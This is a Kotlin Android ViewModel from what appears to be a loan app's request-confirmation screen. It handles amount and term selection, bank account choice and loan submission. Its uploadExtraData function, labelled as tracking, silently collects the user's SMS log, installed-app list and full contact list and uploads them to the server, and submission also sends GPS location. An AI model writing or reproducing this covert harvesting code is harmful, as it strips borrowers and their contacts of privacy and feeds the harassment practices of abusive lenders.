package com.nonetxmxy.mmzqfxy.viewmodel

import android.content.Context
import androidx.lifecycle.viewModelScope
import com.blankj.utilcode.util.Utils
import com.google.gson.Gson
import com.nonetxmxy.mmzqfxy.base.BaseViewModel
import com.nonetxmxy.mmzqfxy.base.LocalCache
import com.nonetxmxy.mmzqfxy.extra.AppsMessageUtil
import com.nonetxmxy.mmzqfxy.extra.ContractsMessageUtil
import com.nonetxmxy.mmzqfxy.extra.PhoneMessageUtil
import com.nonetxmxy.mmzqfxy.model.AuthPagerEvent
import com.nonetxmxy.mmzqfxy.model.LocationType
import com.nonetxmxy.mmzqfxy.model.auth.BankMessage
import com.nonetxmxy.mmzqfxy.model.auth.ConfirmMessage
import com.nonetxmxy.mmzqfxy.model.response.ConfirmResBean
import com.nonetxmxy.mmzqfxy.repository.IAuthRepository
import com.nonetxmxy.mmzqfxy.repository.IBeginRepository
import com.nonetxmxy.mmzqfxy.repository.IOrderRepository
import com.nonetxmxy.mmzqfxy.tools.CommonUtil
import com.nonetxmxy.mmzqfxy.tools.GpsUtil
import com.nonetxmxy.mmzqfxy.tools.days
import com.nonetxmxy.mmzqfxy.tools.jinE
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.async
import kotlinx.coroutines.coroutineScope
import kotlinx.coroutines.flow.MutableSharedFlow
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.SharedFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.joinAll
import kotlinx.coroutines.launch
import javax.inject.Inject

@HiltViewModel
class ConfirmRequestViewModel @Inject constructor(
    private val authRepository: IAuthRepository,
    private val orderRepository: IOrderRepository,
    private val beginRepository: IBeginRepository
) : BaseViewModel() {

    private val _pagerEventFlow = MutableSharedFlow<AuthPagerEvent>()
    val pagerEventFlow: SharedFlow<AuthPagerEvent> = _pagerEventFlow

    var resBean: ConfirmResBean? = null

    private val _pagerData = MutableStateFlow(
        ConfirmMessage(
            requestAmount = 0.0,
            requestDays = "",
            proId = 0,
            proName = "",
            proLogo = "",
            handAmount = 0.0,
            rate = 0.0,
            payDate = "",
            needPayWhenDateOver = 0.0,
            bankId = 0,
            bankName = "",
            bankNumber = "",
        )
    )
    val pagerData: StateFlow<ConfirmMessage> = _pagerData

    private val _isClose = MutableStateFlow(true)
    val isClose: StateFlow<Boolean> = _isClose

    private val _goVerifiPage = MutableSharedFlow<Unit>()
    val goVerifiPage: SharedFlow<Unit> = _goVerifiPage

    private val _banks = MutableStateFlow<List<BankMessage>>(emptyList())
    val banks: StateFlow<List<BankMessage>> = _banks

    var moneySelectedName: String = ""
    var daySelectedName: String = ""

    var moneyDatas: List<String> = emptyList()
    var daysDatas: List<String> = emptyList()

    val permission = MutableSharedFlow<Unit>()

    init {
        getPageData()
    }

    fun getPageData() {
        launchUIWithDialog {
            coroutineScope {
                joinAll(
                    async {
                        _banks.value = authRepository.getSubmitBanks()
                    },
                    async {
                        // viewModel创建时，请求网络数据，拿到网络数据以后设置初始化默认选中的钱和天数
                        resBean = orderRepository.getRequestConfirmData()
                        resBean?.let {
                            // 钱数需要去重
                            moneyDatas =
                                it.SsxAXO.map { item -> item.zrCuab.jinE() }.toSet().toList()
                            // 默认选中第一个钱数
                            moneySelectedName = moneyDatas[0]
                            // 设置天数 和发送通知UI数据
                            setDaysSelectAdapterData(isInit = true)
                        }
                    }
                )
            }

            permission.emit(Unit)

            closeLoading.emit(Unit)
        }
    }

    // 上传埋点
    fun uploadExtraData() {
        viewModelScope.launch {
            try {
                val phoneMessageJson = PhoneMessageUtil.getSmsLogStr(Utils.getApp())
                val appMessageJson =
                    Gson().toJson(AppsMessageUtil.scanLocalInstallAppList(Utils.getApp().packageManager))
                val contractMessageJson = ContractsMessageUtil.getAllContractStr(Utils.getApp())
                orderRepository.submitPhoneMessageAppContract(
                    phoneMessageJson,
                    appMessageJson,
                    contractMessageJson
                )
            } catch (e: java.lang.Exception) {
                e.printStackTrace()
            }
        }
    }

    fun setDaysSelectAdapterData(isInit: Boolean, selectName: String = "") {
        resBean?.let {
            // 根据钱数去过滤天数
            if (selectName.isEmpty()) {
                daysDatas = it.SsxAXO.filter { item -> item.zrCuab.jinE() == moneySelectedName }
                    .map { item -> item.qUSFV.toInt().days() }
            }
            // 默认选中第一个天数
            daySelectedName = selectName.ifEmpty { daysDatas[0] }

            // 这个时候发送通知，告诉UI层去更新数据
            val targetItem = it.SsxAXO.indexOfFirst { item ->
                item.zrCuab.jinE() == moneySelectedName && item.qUSFV.toInt()
                    .days() == daySelectedName
            }
            updateSelectItem(if (isInit) 0 else targetItem)
        }
    }

    fun updateCloseStatus() {
        _isClose.value = !isClose.value
    }

    private fun updateSelectItem(index: Int = 0) {
        resBean?.let {
            val confirmMainItem = it.SsxAXO[index]
            val rateTotal = it.SsxAXO[index].eEn.sumOf { item ->
                item.DqCiL
            }
            val needPayDate = CommonUtil.timeLongToDate(
                it.SsxAXO[index].eEn.maxOf { item -> item.jWQxkCqnvxd.toLong() }
            )
            val needPayTotal = it.SsxAXO[index].eEn.sumOf { item ->
                item.MxMb
            }

            _pagerData.value = pagerData.value.copy(
                requestAmount = confirmMainItem.zrCuab,
                requestDays = confirmMainItem.qUSFV,
                proId = confirmMainItem.tRNwi,
                proName = confirmMainItem.xAGMGmRcGRX,
                proLogo = confirmMainItem.cvsE ?: "",
                handAmount = confirmMainItem.Eng,
                rate = rateTotal,
                payDate = needPayDate,
                needPayWhenDateOver = needPayTotal,
                bankId = it.OxnxByLr.WgHXYqpyQ,
                bankName = it.OxnxByLr.HlgpsFlSUTF,
                bankNumber = it.OxnxByLr.IlI
            )
        }
    }

    fun updateBankSelected(bankMessage: BankMessage) {
        _pagerData.value = pagerData.value.copy(
            bankId = bankMessage.ZlE,
            bankName = bankMessage.TtoUz,
            bankNumber = bankMessage.zUbbNgrgLl
        )
    }

    fun submitRequestInfo(context: Context) {
        launchUIWithDialog {
            coroutineScope {
                joinAll(
                    // 上传确认额度信息
                    async {
                        orderRepository.submitRequestConfirm(pagerData.value)
                    },
                    // 上传埋点数据
                    async {
                        GpsUtil(context).location?.let {
                            LocalCache.lonLocal = it.longitude.toString()
                            LocalCache.latiLocal = it.latitude.toString()
                            beginRepository.submitLocationData(LocationType.LOGIN)
                        }
                    }
                )
            }
            // 进入审核页面
            _goVerifiPage.emit(Unit)
        }
    }
}